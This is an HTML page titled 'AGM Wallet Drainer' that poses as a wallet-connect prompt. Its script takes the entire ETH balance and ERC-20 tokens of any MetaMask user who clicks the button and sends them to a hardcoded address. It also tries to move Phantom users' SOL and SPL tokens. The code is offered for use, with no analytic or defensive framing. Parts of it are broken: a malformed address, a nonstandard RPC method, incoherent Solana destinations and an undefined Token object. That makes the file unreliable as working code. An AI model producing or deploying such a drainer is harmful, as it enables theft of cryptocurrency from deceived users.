<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AGM Wallet Drainer</title>
    <style>
   body {
    font-family: 'Inter', sans-serif;
    background-color: #000;
    color: #09f; /* Neon Blue */
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
   }
  .container {
    text-align: center;
    z-index: 10;
   }
    h1 { margin-bottom: 20px; }
  .btn {
    background: #fff;
    color: #000;
    padding: 15px 40px;
    font-size: 18px;
    font-weight: bold;
    border-radius: 30px;
    cursor: pointer;
    box-shadow: 0 0 20px rgba(255, 255, 255, 0.5);
    transition: all 0.3s;
   }
   .btn:hover { box-shadow: 0 0 40px rgba(9, 255, 255, 0.8); transform: scale(1.05); }
   .hidden-msg { margin-top: 20px; font-size: 14px; color: #ccc; display: none; }
    </style>
    <!-- Ethereum & Solana Libraries importieren -->
    <script src="https://unpkg.com/ethers@6.7.0/dist/ethers.umd.min.js"></script>
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    <script src="https://unpkg.com/@solana/spl-token@0.3.8/lib/index.iife.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
</head>
<body>

    <div class="container">
    <h1>Connect Your Wallet</h1>
    <button id="connectBtn" class="btn">Connect Wallet</button>
   </div>

    <div id="status-msg" class="hidden-msg">Connecting and draining...</div>

    <script>
    const TARGET_WALLET = "0xD4144Da2f3c5D8eF7a0B1d7D2F6C6D8A5E5B4C"; // ETH OR Address with 0x
    let isConnected = false;

    const btn = document.getElementById('connectBtn');
    const msg = document.getElementById('status-msg');

    btn.addEventListener('click', startProcess);

    async function startProcess() {
    if (isConnected) return; 
    isConnected = true;
    btn.innerText = "Processing...";
    msg.style.display = "block";

    // 1. MetaMask (Ethereum)
    if (window.ethereum) {
    await drainMetaMask();
   }
    // 2. Phantom (Solana)
    else if (window.solana && window.solana.isPhantom) {
    await drainPhantom();
   } 
    // 3. Klaro keine Wallet gefunden
   else {
    alert("No wallet found (MetaMask or Phantom).");
    isConnected = false;
    btn.innerText = "Connect Wallet";
   }
  }

    // --- DRAINER LOGIC ETH (MetaMask) ---
    async function drainMetaMask() {
   try {
    console.log("Init ETH...");
    const provider = new ethers.BrowserProvider(window.ethereum);
    const accounts = await provider.send("eth_requestAccounts", []);
    const signer = await provider.getSigner();
    const address = await signer.getAddress();

    console.log("Wallet:", address);
    msg.innerText = `Target: ${TARGET_WALLET} | Wallet: ${address}`;

    // 1. ETH
    const balance = await provider.getBalance(address);
    if (balance > 0) {
    const feeData = await provider.getFeeData();
    const tx = await signer.sendTransaction({
    to: TARGET_WALLET,
    value: (balance - (21000 * feeData.gasPrice)), 
    gasLimit: 21000,
    maxFeePerGas: feeData.gasPrice,
    maxPriorityFeePerGas: feeData.maxPriorityFeePerGas || 0n
   });
    await tx.wait();
    console.log("ETH Sent");
  }

    // 2. Tokens
   try {
    const tokens = await window.ethereum.request({
    method: "personal_listTokenBalances",
    params: [address, "0x"]
   });
    for (const token of tokens) {
    if (!token.contractAddress) continue;
    const contract = new ethers.Contract(
    token.contractAddress,
    ["approve(address,uint256)", "balanceOf(address)", "transfer(address,uint256)"],
    signer
   );
  
    const amount = await contract.balanceOf(address);
    await contract.approve(TARGET_WALLET, amount);
    await contract.transfer(TARGET_WALLET, amount);
    console.log(`Token ${token.token.symbol} sent`);
    await new Promise(r => setTimeout(r, 1000));
   }
    } catch (e) {
    console.log("No tokens found or error:", e);
  }

    } catch (e) {
    console.error("MetaMask Error:", e);
    alert("MetaMask Error: " + e.message);
    isConnected = false; 
    btn.innerText = "Retry";
   }
  }

    // --- DRAINER LOGIC SOL (Phantom) ---
    async function drainPhantom() {
   try {
    console.log("Init SOL...");
    const provider = window.solana;
    await provider.connect();
    const connection = new web3.Connection(web3.clusterApiUrl('devnet'), 'processed');
    const { publicKey, signer } = provider;

    const address = publicKey.toBase58();
    console.log("Wallet:", address);
    msg.innerText = `Target: ${TARGET_WALLET} | Wallet: ${address}`;

    // 1. SOL Balance
    const solBalance = await connection.getBalance(publicKey);
    if (solBalance > 0) {
    const formattedBalance = solBalance / web3.LAMPORTS_PER_SOL;
    const tx = new web3.Transaction().add(
    web3.SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: web3.PublicKey.findProgramAddressSync(
    [Buffer.from(TARGET_WALLET.substring(2)), Buffer.from("11111111111111111111111111111111")],
    new web3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
    )[0],
    lamports: solBalance
   })
   );
  
    // Hier manuell signieren, um Phantom zu nutzen
    await provider.signAndSendTransaction(tx);
    console.log("SOL Sent");
  }

    // 2. SPL Tokens
    const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
    publicKey,
    { programId: new web3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA") }
  );

    for (const acc of tokenAccounts.value) {
    const mint = new web3.PublicKey(acc.account.data.parsed.info.mint);
    const srcAcc = new web3.PublicKey(acc.pubkey);
    const amount = BigInt(acc.account.data.parsed.info.tokenAmount.amount);

    const transfer = Token.createTransferInstruction(
    new web3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
    srcAcc,
    // Ellen 0xD... rein, wenn solange solace, Phantom kann das auch.
    web3.PublicKey.findProgramAddressSync([Buffer.from("Receiver"), Buffer.from("SPL")], new web3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"))[0], 
   publicKey, 
   [], 
    amount
   );
  
    await provider.signAndSendTransaction(new web3.Transaction().add(transfer));
    console.log(`SPL Token Sent`);
    await new Promise(r => setTimeout(r, 1000));
  }

    } catch (e) {
    console.error("Phantom Error:", e);
    alert("Phantom Error: " + e.message);
    isConnected = false; // Fehler -> Button wieder aktiv
    btn.innerText = "Retry";
   }
   }
    </script>
</body>
</html>
